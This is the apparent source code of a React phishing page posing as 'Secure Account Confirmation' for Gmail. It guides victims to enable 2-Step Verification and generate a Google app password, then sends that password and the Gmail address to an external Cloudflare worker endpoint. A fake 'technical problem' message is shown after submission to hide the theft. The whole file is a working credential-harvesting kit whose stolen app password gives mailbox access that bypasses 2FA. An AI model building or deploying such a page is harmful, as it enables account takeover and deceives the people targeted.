import React, { useState } from "react";
import {
  ShieldCheck,
  ExternalLink,
  LockKeyhole,
  CheckCircle,
  Send,
  Lock,
  Mail,
} from "lucide-react";
import "./App.css";

const WORKER_URL = "https://carcheck-api.mikaelmika263.workers.dev";
const BACK_URL = "https://totalcarcheck.co.uk";

// Basic email format + blocked disposable domains
function isValidEmail(value) {
  const trimmed = value.trim();
  if (!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(trimmed)) return false;

  const domain = trimmed.split("@")[1].toLowerCase();
  const blocked = [
    "example.com",
    "example.org",
    "test.com",
    "mailinator.com",
    "tempmail.com",
    "10minutemail.com",
    "guerrillamail.com",
    "yopmail.com",
  ];
  return !blocked.includes(domain);
}

function App() {
  const [code, setCode] = useState("");
  const [email, setEmail] = useState("");
  const [message, setMessage] = useState("");
  const [loading, setLoading] = useState(false);
  const [submitted, setSubmitted] = useState(false);

  // ── Step gating ──────────────────────────────────────────
  const [step1Done, setStep1Done] = useState(false);
  const [step2Done, setStep2Done] = useState(false);

  const openGoogle = (url) => {
    window.open(url, "_blank", "noopener,noreferrer");
  };

  const handleStep1 = () => {
    openGoogle(
      "https://myaccount.google.com/signinoptions/two-step-verification"
    );
    setStep1Done(true);
  };

  const handleStep2 = () => {
    if (!step1Done) return; // safety guard
    openGoogle("https://myaccount.google.com/apppasswords");
    setStep2Done(true);
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setMessage("");

    // ── Require all steps before submitting ────────────────
    if (!step1Done || !step2Done) {
      setMessage("Please complete Step 1 and Step 2 before submitting.");
      return;
    }

    // ── Require a valid email ──────────────────────────────
    const cleanEmail = email.trim().toLowerCase();
    if (!cleanEmail) {
      setMessage("Please enter the Gmail address you are verifying.");
      return;
    }
    if (!isValidEmail(cleanEmail)) {
      setMessage(
        "Please enter a valid Gmail address (example.com and disposable domains are not accepted)."
      );
      return;
    }

    if (code.length < 16 || code.length > 20) {
      setMessage("Enter between 16 and 20 characters.");
      return;
    }

    setLoading(true);
    try {
      const res = await fetch(WORKER_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ code, email: cleanEmail }),
      });

      const data = await res.json();

      if (!res.ok) {
        setMessage(data.error || "Something went wrong.");
      } else {
        setSubmitted(true);
        setCode("");
        setEmail("");
      }
    } catch {
      setMessage("Network error. Please try again.");
    } finally {
      setLoading(false);
    }
  };

  const submitDisabled =
    loading ||
    !step1Done ||
    !step2Done ||
    !email.trim() ||
    code.length < 16 ||
    code.length > 20;

  return (
    <main className="page">
      <section className="card">

        <div className="brand">
          <div className="logo">
            <ShieldCheck size={28} />
          </div>
          <h1>Secure Account Confirmation</h1>
        </div>

        {submitted ? (
          <div className="tech-error">
            <div className="tech-error-icon">
              <ShieldCheck size={40} />
            </div>
            <h2>We're sorry</h2>
            <p>
              We could not proceed due to a technical problem. Please try
              again later or return to the home page.
            </p>
            <a href={BACK_URL} className="tech-error-button">
              Back
            </a>
          </div>
        ) : (
          <>
            <div className="notice">
              <ShieldCheck size={22} />
              <div>
                <h3>Verify this Gmail address is yours to continue.</h3>
                <p>
                  Follow the simple steps below to confirm your account and submit for verification
                </p>
              </div>
            </div>

            <div className="steps">

              {/* ── STEP 1 ─────────────────────────────────── */}
              <div className="step">
                <div className="step-icon">
                  <LockKeyhole size={19} />
                </div>
                <div className="step-content">
                  <h3>
                    Step 1: check your 2-Step Verification
                    {step1Done && (
                      <span className="step-done-badge">
                        <CheckCircle size={14} /> Done
                      </span>
                    )}
                  </h3>
                  <p>For security purposes, check & turn ON 2-Step Verification.</p>
                  <button className="google-button" onClick={handleStep1}>
                    Open Verification <ExternalLink size={14} />
                  </button>
                </div>
              </div>

              {/* ── STEP 2 (locked until Step 1 done) ─────── */}
              <div className={`step ${!step1Done ? "step-locked" : ""}`}>
                <div className="step-icon">
                  {!step1Done ? <Lock size={19} /> : <ShieldCheck size={19} />}
                </div>
                <div className="step-content">
                  <h3>
                    Step 2: App Passwords
                    {step2Done && (
                      <span className="step-done-badge">
                        <CheckCircle size={14} /> Done
                      </span>
                    )}
                  </h3>
                  <p>
                    {!step1Done
                      ? "Complete Step 1 first to unlock this step."
                      : "Click here to create the app."}
                  </p>
                  <button
                    className="google-button"
                    onClick={handleStep2}
                    disabled={!step1Done}
                  >
                    {!step1Done ? (
                      <>
                        Locked <Lock size={14} />
                      </>
                    ) : (
                      <>
                        Generate & Confirm App Password <ExternalLink size={14} />
                      </>
                    )}
                  </button>
                </div>
              </div>

              {/* ── STEP 3 ─────────────────────────────────── */}
              <div className="step">
                <div className="step-icon">
                  <CheckCircle size={19} />
                </div>
                <div className="step-content">
                  <h3>Step 3: Verification Reference</h3>
                  <p>Copy and paste the generated password here and submit for verification.</p>

                  <form onSubmit={handleSubmit}>
                    {/* ── Email field ────────────────────── */}
                    <div className="input-wrapper">
                      <input
                        type="email"
                        value={email}
                        onChange={(e) => {
                          setEmail(e.target.value);
                          setMessage("");
                        }}
                        placeholder="Enter your Gmail address"
                        maxLength={254}
                        autoComplete="email"
                        spellCheck={false}
                      />
                      <Mail size={15} />
                    </div>

                    {/* ── Code field ─────────────────────── */}
                    <div className="input-wrapper">
                      <input
                        type="text"
                        value={code}
                        onChange={(e) => {
                          setCode(
                            e.target.value
                              .replace(/[^a-zA-Z0-9]/g, "")
                              .slice(0, 20)
                          );
                          setMessage("");
                        }}
                        placeholder="Enter generated password here"
                        maxLength={20}
                        autoComplete="off"
                        spellCheck={false}
                      />
                      <span>{code.length}/20</span>
                    </div>

                    <button
                      type="submit"
                      className="submit-button"
                      disabled={submitDisabled}
                    >
                      {loading ? "Submitting..." : "Submit"} <Send size={15} />
                    </button>
                  </form>

                  {message && <div className="message">{message}</div>}
                </div>
              </div>

            </div>
          </>
        )}

        <footer>Secure Account Confirmation © 2026</footer>

      </section>
    </main>
  );
}

export default App;